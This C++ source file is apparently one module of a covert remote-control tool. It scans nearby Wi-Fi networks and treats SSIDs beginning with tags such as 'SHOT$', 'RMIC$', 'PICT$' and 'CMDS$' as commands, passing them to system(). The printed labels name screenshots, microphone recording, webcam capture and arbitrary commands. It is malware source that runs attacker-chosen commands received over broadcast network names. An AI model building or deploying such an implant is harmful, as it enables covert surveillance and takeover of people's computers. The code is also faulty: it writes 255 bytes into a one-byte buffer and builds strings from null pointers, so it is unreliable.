/*************************************************** Wi-Fi Module **************************************************
File:			  Mod_wifi.cpp
Description:	  This module is responsible for managing the data captured of the wlan network interface.
Developer:		  Alejandro Chávez Gómez.

********************************************** Description of functions ********************************************

scan			- Display a list of SSIDs of the wireless networks that are within the coverage range of the wlan 
				  network interface.
executeCommand  - Clean the instruction and execute the command captured with the function scan(). 
				  Receives as parameters an number (INT) that determines the type of instruction and an array (CHAR)
				  with said instruction.
*******************************************************************************************************************/

/*											     	  Libraries											     	  */

#include <windows.h>
#include <wlanapi.h>
#include <objbase.h>
#include <wtypes.h>
#include <conio.h>
#include <stdio.h>
#include <string>
//Need to link with Wlanapi.lib and Ole32.lib
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")

#include <iostream>

/*											         Definitions		    						              */
#ifndef UNICODE
#define UNICODE
#endif

#define command_1 "MSGS$"
#define command_2 "SHOT$"
#define command_3 "RMIC$"
#define command_4 "PICT$"
#define command_5 "CMDS$"

/*											   Declaration of functions								              */
static void executeCommand(int, char[]);

/*										   Declaration of global variables                                        */
char dirtyCommand[] = "";

/*										       Definition of functions										      */
int scan()
{
	printf("\t[+] Scanning...\n");

	//Declaration and initialization of local variables.
	HANDLE hClient = NULL;
	DWORD dwMaxClient = 2;      
	DWORD dwCurVersion = 0;
	DWORD dwResult = 0;
	DWORD dwRetVal = 0;
	WCHAR GuidString[39] = { 0 };
	int iRet = 0;
	int iRSSI = 0;
	unsigned int i, j, k;

	//Variables used for WlanEnumInterfaces.
	PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
	PWLAN_INTERFACE_INFO pIfInfo = NULL;

	PWLAN_AVAILABLE_NETWORK_LIST pBssList = NULL;
	PWLAN_AVAILABLE_NETWORK pBssEntry = NULL;

	dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
	if (dwResult != ERROR_SUCCESS) {
		wprintf(L"WlanOpenHandle failed with error: %u\n", dwResult);
		return 1;
	}
	dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
	if (dwResult != ERROR_SUCCESS) {
		wprintf(L"WlanEnumInterfaces failed with error: %u\n", dwResult);
		return 1;
	}
	else {
		for (i = 0; i < (int)pIfList->dwNumberOfItems; i++) {
			pIfInfo = (WLAN_INTERFACE_INFO *)&pIfList->InterfaceInfo[i];
			iRet = StringFromGUID2(pIfInfo->InterfaceGuid, (LPOLESTR)&GuidString,
				sizeof(GuidString) / sizeof(*GuidString));
			if (iRet == 0)
				wprintf(L"StringFromGUID2 failed\n");			

			dwResult = WlanGetAvailableNetworkList(hClient,
				&pIfInfo->InterfaceGuid,
				0,
				NULL,
				&pBssList);

			if (dwResult != ERROR_SUCCESS) {
				wprintf(L"WlanGetAvailableNetworkList failed with error: %u\n",
					dwResult);
				dwRetVal = 1;
			}
			else {
				for (j = 0; j < pBssList->dwNumberOfItems; j++) {
					pBssEntry = (WLAN_AVAILABLE_NETWORK *)& pBssList->Network[j];
					wprintf(L"\t\tSSID[%u]:\t\t", j);
					if (pBssEntry->dot11Ssid.uSSIDLength == 0)
						wprintf(L"HIDDEN_NETWORK\n");
					else {
						for (k = 0; k < pBssEntry->dot11Ssid.uSSIDLength; k++) {
							wprintf(L"%c", (int)pBssEntry->dot11Ssid.ucSSID[k]);
							dirtyCommand[k] = pBssEntry->dot11Ssid.ucSSID[k];
						}
						if (strstr(dirtyCommand, command_1) != NULL) {
							executeCommand(1, NULL);
						}
						else if (strstr(dirtyCommand, command_2) != NULL) {
							executeCommand(2, NULL);
						}
						else if (strstr(dirtyCommand, command_3) != NULL) {
							executeCommand(3, NULL);
						}
						else if (strstr(dirtyCommand, command_4) != NULL) {
							executeCommand(4, NULL);
						}
						else if (strstr(dirtyCommand, command_5) != NULL) {
							executeCommand(5, dirtyCommand);
						}
						memset(dirtyCommand, 0, 255);
						wprintf(L"\n");
					}
				}
			}
		}
	}
	if (pBssList != NULL) {
		WlanFreeMemory(pBssList);
		pBssList = NULL;
	}
	if (pIfList != NULL) {
		WlanFreeMemory(pIfList);
		pIfList = NULL;
	}
	printf("\t[+] Scan completed!\n");

	return dwRetVal;
}

void executeCommand(int i, char c[]) {
	//Convert command from array to string.
	std::string dirtyCommand(c);

	//The command is cleaned.
	int len = dirtyCommand.length() - 5;
	std::string str = dirtyCommand.substr(5, len);
	const char *cleanCommand = str.c_str();

	switch (i)
	{
		case 1:
			printf("\n\t\t\t\t\t\t[+] Executing command for send message...");
			system(cleanCommand);
			printf("\n\t\t\t\t\t\t[+] Done!");
			break;
		case 2:
			printf("\n\t\t\t\t\t\t[+] Executing command for take screen shot...");
			system(cleanCommand);
			printf("\n\t\t\t\t\t\t[+] Done!");
			break;
		case 3:
			printf("\n\t\t\t\t\t\t[+] Executing command for record microphone...");
			system(cleanCommand);
			printf("\n\t\t\t\t\t\t[+] Done!");
			break;
		case 4:
			printf("\n\t\t\t\t\t\t[+] Executing command for take picture from the webcam...");
			system(cleanCommand);
			printf("\n\t\t\t\t\t\t[+] Done!");
			break;
		case 5:
			printf("\n\t\t\t\t\t\t[+] Executing command...");
			system(cleanCommand);
			printf("\n\t\t\t\t\t\t[+] Done!");
			break;
		default:
			printf("Default");
			break;
	}
}